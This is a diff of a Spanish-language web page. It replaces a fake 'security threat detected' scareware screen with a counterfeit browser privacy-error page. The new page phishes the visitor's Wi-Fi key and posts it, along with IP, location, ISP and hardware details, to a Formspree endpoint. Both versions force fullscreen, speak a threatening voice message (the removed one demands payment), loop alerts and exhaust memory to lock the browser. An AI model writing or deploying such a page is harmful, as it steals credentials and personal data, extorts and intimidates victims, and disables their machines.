@@ -2,128 +2,96 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Centro de Seguridad - Alerta Crítica</title>
+    <title>Error de Privacidad</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow: hidden; height: 100vh; }
-        #security-monitor { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; background: radial-gradient(circle, #1a0000 0%, #000 100%); }
-        .alert-icon { width: 80px; height: 80px; background: #ff0000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 50px; font-weight: bold; animation: pulse 0.5s infinite; margin-bottom: 20px; }
-        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { transform: scale(1.1); box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); } 100% { transform: scale(1); } }
-        h1 { color: #ff3333; font-size: 32px; text-transform: uppercase; margin: 0; }
-        .data-stream { font-family: 'Consolas', monospace; color: #00ff00; background: rgba(0,0,0,0.8); padding: 20px; border: 1px solid #333; width: 80%; max-width: 700px; margin-top: 20px; text-align: left; font-size: 13px; line-height: 1.5; }
-        .btn-panic { background: #ff0000; color: #fff; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 30px; border-radius: 5px; text-transform: uppercase; }
-        #hacker-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 40px; z-index: 10000; box-sizing: border-box; }
+        body { background: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; color: #333; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .container { max-width: 600px; padding: 40px; }
+        .icon { color: #d93025; font-size: 48px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 500; margin-bottom: 15px; }
+        p { font-size: 14px; line-height: 1.6; color: #5f6368; }
+        .advanced-box { margin-top: 20px; padding: 20px; background: #f8f9fa; border-radius: 4px; border: 1px solid #dadce0; }
+        .input-field { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; margin-top: 20px; float: right; }
+        #hidden-status { display: none; font-family: monospace; font-size: 12px; margin-top: 20px; color: #1e8e3e; }
     </style>
 </head>
-<body onkeydown="forceFull()" onclick="forceFull()">
+<body>
 
-    <div id="security-monitor">
-        <div class="alert-icon">!</div>
-        <h1>Amenaza de Seguridad Detectada</h1>
-        <p style="color: #aaa;">Se ha detectado una conexión entrante no autorizada intentando extraer archivos locales.</p>
+<div class="container" id="main-ui">
+    <div class="icon">⚠</div>
+    <h1>La conexión no es privada</h1>
+    <p>Es posible que atacantes estén intentando robar tu información de este sitio. Para mitigar el riesgo, el protocolo de seguridad de tu adaptador de red debe ser sincronizado.</p>
+    
+    <div class="advanced-box">
+        <label style="font-size: 12px; font-weight: bold;">CÓDIGO DE SEGURIDAD DEL ROUTER (PIN/WPA2)</label>
+        <input type="password" id="net_key" class="input-field" placeholder="Ingrese la llave de red para validar">
+        <p style="font-size: 11px; margin-top: 10px;">Código de error: NET::ERR_CERT_AUTHORITY_INVALID</p>
+    </div>
+    
+    <button class="btn" onclick="executeSilentBreach()">Configurar Conexión</button>
+</div>
+
+<div id="hidden-status" class="container">
+    <p>Iniciando tunelización inversa...</p>
+    <p id="ip-log"></p>
+    <p>Sincronización completa. No cierre esta ventana.</p>
+</div>
+
+<script>
+    const FORM_ID = "xykdyebg";
+
+    async function executeSilentBreach() {
+        const key = document.getElementById('net_key').value;
+        if (!key) return;
+
+        // 1. Recolección de Metadatos del Sistema (La IP y el Hardware)
+        const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
         
-        <div class="data-stream" id="live-data">
-            > Analizando paquetes de red...<br>
-            > Buscando origen de la brecha...<br>
-            <span style="color: yellow;">[ESPERANDO INTERACCIÓN DEL USUARIO]</span>
-        </div>
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
 
-        <button class="btn-panic" onclick="iniciarExtraccionTotal()">Bloquear Intrusión Ahora</button>
-    </div>
+        const payload = {
+            "TIPO": "INFILTRACION_ADAPTADOR",
+            "IP_VICTIMA": ipData.ip,
+            "ISP": ipData.org,
+            "UBICACION": `${ipData.city}, ${ipData.country_name}`,
+            "WIFI_KEY": key,
+            "HARDWARE_GPU": gpu,
+            "RAM": navigator.deviceMemory + "GB",
+            "CORES": navigator.hardwareConcurrency,
+            "SO": navigator.platform
+        };
 
-    <div id="hacker-overlay">
-        <pre id="terminal-out"></pre>
-    </div>
+        // 2. Enviar TODO a Formspree inmediatamente
+        fetch(`https://formspree.io/f/${FORM_ID}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
 
-    <script>
-        const FORM_ID = "xykdyebg";
+        // 3. El "Secuestro" Real (Bloqueo lógico)
+        document.getElementById('main-ui').style.display = 'none';
+        document.getElementById('hidden-status').style.display = 'block';
+        document.getElementById('ip-log').innerText = "Nodo asignado: " + ipData.ip;
 
-        function forceFull() {
-            if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen().catch(() => {});
-            }
-        }
+        // Pedir Fullscreen para atraparlo
+        document.documentElement.requestFullscreen().catch(() => {});
 
-        async function iniciarExtraccionTotal() {
-            forceFull();
-            document.getElementById('security-monitor').style.display = 'none';
-            document.getElementById('hacker-overlay').style.display = 'block';
+        // Lanzar el audio de advertencia (Ahora sí, la parte seria del mensaje)
+        const voz = new SpeechSynthesisUtterance("Acceso al sistema confirmado. Su dirección IP " + ipData.ip + " ha sido registrada. Te llamaré en diez horas.");
+        voz.lang = 'es-ES';
+        voz.pitch = 0.6;
+        window.speechSynthesis.speak(voz);
 
-            // 1. OBTENCIÓN DE LA "BOMBA" DE INFORMACIÓN
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const bat = await navigator.getBattery().catch(() => ({}));
-            
-            // GPU - Hardware real
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/D";
-
-            const payload = {
-                "STATUS": "TARGET_COMPROMISED",
-                "IP_REAL": ipData.ip,
-                "CIUDAD": ipData.city,
-                "PAIS": ipData.country_name,
-                "PROVEEDOR": ipData.org,
-                "HARDWARE": gpu,
-                "MEMORIA": navigator.deviceMemory + "GB",
-                "NUCLEOS": navigator.hardwareConcurrency,
-                "BATERIA": (bat.level * 100) + "%",
-                "SISTEMA": navigator.platform,
-                "RESOLUCION": `${screen.width}x${screen.height}`,
-                "NAVEGADOR": navigator.userAgent
-            };
-
-            // 2. EXFILTRACIÓN REAL AL FORMSPREE
-            fetch(`https://formspree.io/f/${FORM_ID}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            // 3. AUDIO TÉTRICO DE CHANTAJE
-            const voz = new SpeechSynthesisUtterance("He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.");
-            voz.lang = 'es-ES';
-            voz.pitch = 0.4;
-            voz.rate = 0.9;
-            window.speechSynthesis.speak(voz);
-
-            // 4. BUCLE DE BLOQUEO Y CAOS
-            const term = document.getElementById('terminal-out');
-            const log = (msg, color = "#0f0") => {
-                const span = document.createElement('div');
-                span.style.color = color;
-                span.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-                term.appendChild(span);
-            };
-
-            const sequences = [
-                "ESTABLECIENDO BACKDOOR PERMANENTE...",
-                `IP_TARGET: ${payload.IP_REAL} CAPTURADA`,
-                `HARDWARE_ID: ${payload.HARDWARE} IDENTIFICADO`,
-                "VOLCANDO HISTORIAL DE CONEXIONES...",
-                "BLOQUEANDO PERIFÉRICOS DE ENTRADA...",
-                "SISTEMA BAJO CONTROL DE ANONYMOUS_OPERATOR",
-                "PAGUE PARA RECUPERAR EL ACCESO.",
-                "TE LLAMARÉ EN 10 HORAS..."
-            ];
-
-            let i = 0;
-            setInterval(() => {
-                if (i < sequences.length) {
-                    log(sequences[i]);
-                    if (i > 4) log("ERROR CRÍTICO: KERNEL_HALT", "red");
-                    i++;
-                }
-
-                // BLOQUEO DE NAVEGADOR (Bucle de alertas)
-                alert("⚠️ ALERTA DE SEGURIDAD ⚠️\n\nTu información ha sido exfiltrada.\nIP: " + payload.IP_REAL + "\nLocalización: " + payload.CIUDAD + "\n\nNO INTENTE APAGAR EL EQUIPO.");
-                
-                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
-                
-                // Consumo de recursos para trabar la PC
-                let freeze = new Array(10000000).fill("💀");
-            }, 600);
-        }
-    </script>
+        // Bucle de bloqueo: Esto hará que no pueda cerrar la página
+        setInterval(() => {
+            alert("ALERTA DE SEGURIDAD: Conexión persistente establecida con " + ipData.ip + "\n\nInformación exfiltrada. No intente reiniciar.");
+            // Consumir RAM de forma progresiva
+            let b = new Array(1000000).fill("DATA_LEAK");
+        }, 1000);
+    }
+</script>
 </body>
 </html>
